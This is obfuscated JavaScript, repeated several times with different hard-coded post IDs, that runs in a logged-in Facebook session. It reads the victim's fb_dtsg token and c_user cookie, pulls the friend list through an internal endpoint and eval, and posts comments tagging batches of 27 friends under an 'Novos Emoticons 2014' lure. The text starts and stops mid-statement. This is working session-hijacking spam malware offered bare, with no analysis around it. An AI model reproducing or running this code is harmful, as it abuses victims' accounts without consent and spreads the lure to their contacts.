_0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","399162470227562","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","414030905407385","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","485813548184768","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","681278585261928","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","432557003555937","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function (){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","822753677739551","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var 